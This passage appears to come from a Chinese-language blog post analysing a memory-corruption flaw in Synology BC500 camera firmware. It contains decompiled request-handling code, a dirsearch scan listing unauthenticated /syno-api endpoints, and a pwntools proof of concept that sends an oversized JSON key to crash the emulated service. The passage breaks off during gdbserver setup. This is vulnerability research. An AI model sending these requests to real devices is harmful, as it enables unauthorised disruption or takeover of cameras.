class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_35CEC</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">......</span><br><span class="line">  method = <span class="built_in">sub_194D8</span>(a1);</span><br><span class="line">  s1 = v62;</span><br><span class="line">  v63 = v65;</span><br><span class="line">  v66[<span class="number">0</span>] = v67;</span><br><span class="line">  v61 = <span class="number">0</span>;</span><br><span class="line">  v62[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v64 = <span class="number">0</span>;</span><br><span class="line">  v65[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v66[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v67[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v90, <span class="number">0</span>, <span class="built_in">sizeof</span>(v90));</span><br><span class="line">  v3 = <span class="built_in">sub_8B548</span>((<span class="type">int</span>)<span class="string">"Custom.Activated"</span>);</span><br><span class="line">  v4 = (<span class="type">char</span> *)method[<span class="number">4</span>];</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(<span class="string">"/syno-api"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v4, <span class="string">"/syno-api"</span>, v5) )</span><br><span class="line">  {</span><br><span class="line">LABEL_45:</span><br><span class="line">    v9 = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">  }</span><br><span class="line">  v6 = (<span class="type">const</span> <span class="type">char</span> *)*method;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)*method, <span class="string">"GET"</span>) &amp;&amp; <span class="built_in">strcmp</span>(v6, <span class="string">"PUT"</span>) &amp;&amp; <span class="built_in">strcmp</span>(v6, <span class="string">"POST"</span>) &amp;&amp; <span class="built_in">strcmp</span>(v6, <span class="string">"DELETE"</span>) )</span><br><span class="line">  {</span><br><span class="line">    std::string::<span class="built_in">assign</span>(v66, <span class="string">"Method Not Allowed"</span>);</span><br><span class="line">    v9 = <span class="number">405</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">sub_31A40</span>(v68, v4);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;s1, v68);</span><br><span class="line">  <span class="keyword">if</span> ( v68[<span class="number">0</span>] != &amp;v69 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v68[<span class="number">0</span>])</span></span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 || <span class="built_in">sub_3CC70</span>((<span class="type">int</span>)&amp;unk_C1964, (<span class="type">int</span>)&amp;s1) || <span class="built_in">sub_3CC70</span>((<span class="type">int</span>)&amp;unk_C1980, (<span class="type">int</span>)&amp;s1) )</span><br><span class="line">  {</span><br><span class="line">LABEL_7:</span><br><span class="line">    path = (<span class="type">char</span> *)method[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(path, <span class="string">"/syno-api/security"</span>) || !<span class="built_in">strcmp</span>(path, <span class="string">"/syno-api/security/encryption_key"</span>) )</span><br><span class="line">    {</span><br><span class="line">    .....</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(path, <span class="string">"/syno-api/session"</span>) &amp;&amp; !<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)*method, <span class="string">"GET"</span>) )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">sub_33B2C</span>(method) )</span><br><span class="line">            <span class="built_in">sub_337D4</span>((<span class="type">int</span>)v76);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">sub_31A40</span>(v76, <span class="string">"Invalid session"</span>);</span><br><span class="line">          std::string::<span class="keyword">operator</span>=(&amp;v63, v76);</span><br><span class="line">          <span class="keyword">if</span> ( v76[<span class="number">0</span>] != &amp;v77 )</span><br><span class="line">            <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v76[<span class="number">0</span>])</span></span>;</span><br><span class="line">          <span class="built_in">sub_31A40</span>(&amp;nptr, <span class="string">""</span>);</span><br><span class="line">          <span class="built_in">send_page</span>(a1, <span class="number">200</span>, &amp;v63, &amp;nptr);</span><br><span class="line">          v48 = nptr;</span><br><span class="line">          <span class="keyword">if</span> ( nptr == (<span class="type">char</span> *)v88 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_146;</span><br><span class="line">        }</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(path, <span class="string">"/syno-api/camera_cap"</span>) || <span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)*method, <span class="string">"GET"</span>) )</span><br><span class="line">            {</span><br><span class="line">              <span class="built_in">execve_cgi</span>((<span class="type">int</span>)a1, <span class="string">"/www/camera-cgi/synocam_param.cgi"</span>);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">            }</span><br><span class="line">            file = <span class="built_in">json_load_file</span>(<span class="string">"/www/camera-cgi/synocam_cap.json"</span>, <span class="number">4</span>);</span><br><span class="line">            v56 = file;</span><br><span class="line">            <span class="keyword">if</span> ( file )</span><br><span class="line">            {</span><br><span class="line">              <span class="built_in">sub_50DB4</span>(&amp;v83, file);</span><br><span class="line">              <span class="built_in">sub_31A40</span>(&amp;nptr, <span class="string">""</span>);</span><br><span class="line">              <span class="built_in">send_page</span>(a1, <span class="number">200</span>, &amp;v83, &amp;nptr);</span><br><span class="line">              <span class="keyword">if</span> ( nptr != (<span class="type">char</span> *)v88 )</span><br><span class="line">                <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(nptr)</span></span>;</span><br><span class="line">              <span class="keyword">if</span> ( v83 != v85 )</span><br><span class="line">                <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v83)</span></span>;</span><br><span class="line">              <span class="built_in">pgo_free</span>(v56);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">            }</span><br><span class="line">            <span class="built_in">sub_4E38C</span>(</span><br><span class="line">              <span class="number">0</span>,</span><br><span class="line">              (<span class="type">int</span>)<span class="string">"MID/BC500/webservice.cpp"</span>,</span><br><span class="line">              <span class="number">3055</span>,</span><br><span class="line">              (<span class="type">int</span>)<span class="string">"SynoHandler"</span>,</span><br><span class="line">              (<span class="type">int</span>)<span class="string">"System"</span>,</span><br><span class="line">              <span class="number">-1</span>,</span><br><span class="line">              <span class="string">"pgo_load_file [%s] load failed.\n"</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">          }</span><br><span class="line">          v84 = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">LOBYTE</span>(v85[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">          v83 = v85;</span><br><span class="line">          <span class="built_in">memset</span>(v91, <span class="number">0</span>, <span class="built_in">sizeof</span>(v91));</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="built_in">sub_1BA70</span>((<span class="type">int</span>)a1); i &gt; <span class="number">0</span>; i = <span class="built_in">sub_1BA70</span>((<span class="type">int</span>)a1) )</span><br><span class="line">          {</span><br><span class="line">            v20 += i;</span><br><span class="line">            <span class="keyword">if</span> ( v20 &gt; <span class="number">0x100000</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            nptr = (<span class="type">char</span> *)v88;</span><br><span class="line">            std::string::_M_construct&lt;<span class="type">char</span> <span class="type">const</span>*&gt;((<span class="type">int</span>)&amp;nptr, v91);</span><br><span class="line">            std::string::_M_append(&amp;v83, nptr, v87);</span><br><span class="line">            <span class="keyword">if</span> ( nptr != (<span class="type">char</span> *)v88 )</span><br><span class="line">              <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(nptr)</span></span>;</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>所以现在看一下有哪些路由请求可以未授权访问，一开始我是用自己写的脚本来探测的，但是后面看到了这位<a target="_blank" rel="noopener" href="https://eqqie.cn/index.php/archives/2076">师傅</a>的思路之后发现用到dirsearch，查看之后发现这个工具远比我自己写的脚本好用，所以我用dirsearch测试了一下</p>
<p>grep筛选的时候发现<code>vue.bundle.js</code>这个js里存在很多api url，我简单的写了个脚本抓取了一下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'vue.bundle.js'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"></span><br><span class="line">urls = re.findall(<span class="string">r'url:"(.*?)"'</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></tbody></table></figure>

<p>同时我也把整个web目录的所有文件的url都集合到了wordlist.txt里，然后使用dirsearch扫了一下，扫描的时候排除了<code>404,301,401</code></p>
<p>之后发现了一些url是存在未授权访问的</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://127.0.0.1:8801/ -w /your/path/wordlist.txt -x 404,301,401</span><br><span class="line"></span><br><span class="line">[01:33:21] 200 -   24KB - /uistrings/cht/strings                            </span><br><span class="line">[01:33:21] 200 -   24KB - /uistrings/chs/strings                            </span><br><span class="line">[01:33:21] 200 -   27KB - /uistrings/enu/strings                            </span><br><span class="line">[01:33:22] 200 -    6MB - /uistrings/uistrings.cgi.i64                      </span><br><span class="line">[01:33:22] 200 -   28KB - /uistrings/dan/strings</span><br><span class="line">[01:33:22] 200 -   34KB - /uistrings/jpn/strings                            </span><br><span class="line">[01:33:22] 200 -   29KB - /uistrings/ptb/strings</span><br><span class="line">[01:33:22] 200 -   28KB - /uistrings/nor/strings</span><br><span class="line">[01:33:22] 200 -   32KB - /uistrings/hun/strings                            </span><br><span class="line">[01:33:22] 200 -   29KB - /uistrings/ita/strings</span><br><span class="line">[01:33:23] 200 -   29KB - /uistrings/sve/strings                            </span><br><span class="line">[01:33:23] 200 -   31KB - /uistrings/ger/strings</span><br><span class="line">[01:33:22] 200 -   30KB - /uistrings/krn/strings                            </span><br><span class="line">[01:33:23] 200 -   31KB - /uistrings/plk/strings                            </span><br><span class="line">[01:33:23] 200 -   32KB - /uistrings/fre/strings</span><br><span class="line">[01:33:23] 200 -   30KB - /uistrings/ptg/strings</span><br><span class="line">[01:33:23] 200 -   29KB - /uistrings/uistrings.cgi</span><br><span class="line">[01:33:23] 200 -   30KB - /uistrings/nld/strings</span><br><span class="line">[01:33:24] 200 -   48KB - /uistrings/rus/strings                            </span><br><span class="line">[01:33:24] 200 -   61KB - /uistrings/tha/strings                            </span><br><span class="line">[01:33:24] 200 -   30KB - /uistrings/trk/strings</span><br><span class="line">[01:33:23] 200 -   30KB - /uistrings/spn/strings                            </span><br><span class="line">[01:33:23] 200 -   29KB - /uistrings/csy/strings                            </span><br><span class="line">[01:33:25] 200 -    6KB - /crypto.min.js                                    </span><br><span class="line">[01:33:25] 200 -    2MB - /vue.bundle.js                                    </span><br><span class="line">[01:33:25] 200 -   15B  - /syno-api/session                                 </span><br><span class="line">[01:33:25] 200 -    6B  - /syno-api/activate</span><br><span class="line">[01:33:25] 200 -    9B  - /syno-api/security/info/model</span><br><span class="line">[01:33:25] 200 -    9B  - /syno-api/security/info/name                      </span><br><span class="line">[01:33:26] 200 -   14B  - /syno-api/maintenance/firmware/version            </span><br><span class="line">[01:33:26] 200 -    1MB - /style/main.css                                   </span><br><span class="line">[01:33:27] 200 -    7B  - /syno-api/security/info/language                   </span><br><span class="line">[01:33:27] 200 -   21B  - /syno-api/security/info/mac</span><br><span class="line">[01:33:27] 200 -    6B  - /syno-api/security/network/dhcp</span><br><span class="line">[01:33:27] 200 -  105B  - /syno-api/security/info</span><br><span class="line">[01:33:27] 200 -    4B  - /syno-api/security/info/serial_number</span><br></pre></td></tr></tbody></table></figure>

<p>看到了一些<code>/syno-api</code>的url，而这些url会进入<code>synocam_param.cgi</code>，现在分析一下<code>synocam_param.cgi</code></p>
<p>根据format判断返回的格式，然后根据请求方法使用不同函数处理请求</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_7BC84</span><span class="params">(<span class="type">json_t</span> *json, <span class="keyword">volatile</span> <span class="type">size_t</span> a2, <span class="type">json_t</span> *a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">size_t</span> refcount; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">size_t</span> v7; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> *v8; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *method; <span class="comment">// [sp+10h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  a3-&gt;type = (json_type)json;</span><br><span class="line">  a3-&gt;refcount = a2;</span><br><span class="line">  v3 = (<span class="type">const</span> <span class="type">char</span> *)sub_E19C(json, <span class="string">"format"</span>);</span><br><span class="line">  a3[<span class="number">1</span>].type = sub_725A8(v3);</span><br><span class="line">  <span class="keyword">if</span> ( a3[<span class="number">1</span>].type == JSON_INTEGER )</span><br><span class="line">  {</span><br><span class="line">    refcount = a3-&gt;refcount;</span><br><span class="line">    v5 = (<span class="type">const</span> <span class="type">char</span> *)sub_E19C(json, <span class="string">"format"</span>);</span><br><span class="line">    send_page(refcount, <span class="number">400</span>, <span class="string">"Unknown output format[%s]!"</span>, v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    method = (<span class="type">char</span> *)sub_E174((<span class="type">int</span>)json);</span><br><span class="line">    <span class="keyword">if</span> ( method &amp;&amp; !strcasecmp(method, <span class="string">"GET"</span>) )</span><br><span class="line">    {</span><br><span class="line">      handle_get((<span class="type">int</span>)a3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( method &amp;&amp; !strcasecmp(method, <span class="string">"PUT"</span>) )</span><br><span class="line">    {</span><br><span class="line">      handle_put(a3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( method &amp;&amp; !strcasecmp(method, <span class="string">"POST"</span>) )</span><br><span class="line">    {</span><br><span class="line">      handle_post(a3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( !method || strcasecmp(method, <span class="string">"DELETE"</span>) )</span><br><span class="line">      {</span><br><span class="line">        send_page(a3-&gt;refcount, <span class="number">400</span>, <span class="string">"Wrong request method[%s]!"</span>, method);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      }</span><br><span class="line">      hanlde_delete(a3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( off_B8218 != &amp;dword_C8 )</span><br><span class="line">    {</span><br><span class="line">      v7 = a3-&gt;refcount;</span><br><span class="line">      v8 = off_B8218;</span><br><span class="line">      v9 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str(&amp;unk_B82F4);</span><br><span class="line">      send_page(v7, v8, <span class="string">"%s"</span>, v9);</span><br><span class="line">    }</span><br><span class="line">    sub_80A70(&amp;unk_B830C);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在<code>handle_post</code>中，发现传入的数据会进入<code>final_json_load</code>，而<code>final_json_load</code>里会调用<code>json_loads</code></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_79FEC</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">......</span><br><span class="line">  v1 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_E19C</span>(*a1, <span class="string">"json"</span>);</span><br><span class="line">  v24 = <span class="built_in">final_json_load</span>(v1);</span><br><span class="line">  file = <span class="built_in">json_load_file</span>(<span class="string">"/www/camera-cgi/synocam_config.json"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v2 = <span class="built_in">getenv</span>(<span class="string">"SCRIPT_NAME"</span>);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(v2 + <span class="number">1</span>, <span class="number">47</span>);</span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">json_t</span> *__fastcall <span class="title">final_json_load</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">json_t</span> *v5; <span class="comment">// [sp+Ch] [bp-308h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [sp+10h] [bp-304h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">516</span>]; <span class="comment">// [sp+110h] [bp-204h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="built_in">sizeof</span>(v6));</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">json_loads</span>(a1, <span class="number">4u</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (!v5 || v5-&gt;type == JSON_NULL) &amp;&amp; <span class="built_in">sub_10D90</span>(a1, s, <span class="number">512</span>) == <span class="number">1</span> )</span><br><span class="line">    v5 = <span class="built_in">json_loads</span>(s, <span class="number">4u</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (!v5 || v5-&gt;type == JSON_NULL) &amp;&amp; !<span class="built_in">strchr</span>(a1, <span class="number">34</span>) )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">snprintf</span>(v6, <span class="number">0x100</span>u, <span class="string">"\"%s\""</span>, a1);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">json_loads</span>(v6, <span class="number">4u</span>, <span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>至此漏洞分析完成</p>
<h2 id="Poc-amp-调试"><a href="#Poc-amp-调试" class="headerlink" title="Poc&amp;调试"></a>Poc&amp;调试</h2><p>我编写了如下Poc，发现可以让目标crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'arm'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">8801</span></span><br><span class="line"></span><br><span class="line">r = remote(ip, port)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a '</span> + <span class="string">b'a'</span> * <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">b'""'</span></span><br><span class="line">json = <span class="string">b'{"'</span> + p1 + <span class="string">b'": ""}'</span></span><br><span class="line">li(json)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b'\r\n'</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b''</span></span><br><span class="line">p3 += <span class="string">b'POST /syno-api/security/info/mac HTTP/1.1'</span> + rn</span><br><span class="line">p3 += (<span class="string">b"Content-Length: %d"</span> % <span class="built_in">len</span>(json)) +rn</span><br><span class="line">p3 += <span class="string">b'Host: 127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept: text/plain, */*; q=0.01'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Content-Type: application/json'</span> + rn</span><br><span class="line">p3 += <span class="string">b'X-Requested-With: XMLHttpRequest'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-mobile: ?0'</span> + rn</span><br><span class="line">p3 += <span class="string">b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-platform: "macOS"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Origin: http://127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Site: same-origin'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Mode: cors'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Dest: empty'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Referer: http://127.0.0.1:8801/'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Encoding: gzip, deflate'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Language: zh-CN,zh;q=0.9'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Cookie: sid=sBmrHHr4XX4TKaIjv0Vw6L3I15y46m47DO9qeF79CPjquIMOAHX6ygmRJ2AaNleg'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Connection: close'</span> + rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += json</span><br><span class="line"></span><br><span class="line">li(<span class="string">'[+] sendling payload'</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>接着需要去调试一下这个Poc，看一下能否控制程序执行流，下载对应架构的gdbserver到文件系统中，然后<code>find . | cpio -o --format=newc &gt; ../player.cpio</code>打包一下，重新启动就可以使用gdbserver了</p>
<p>添加gdbserver的映射端口</p>
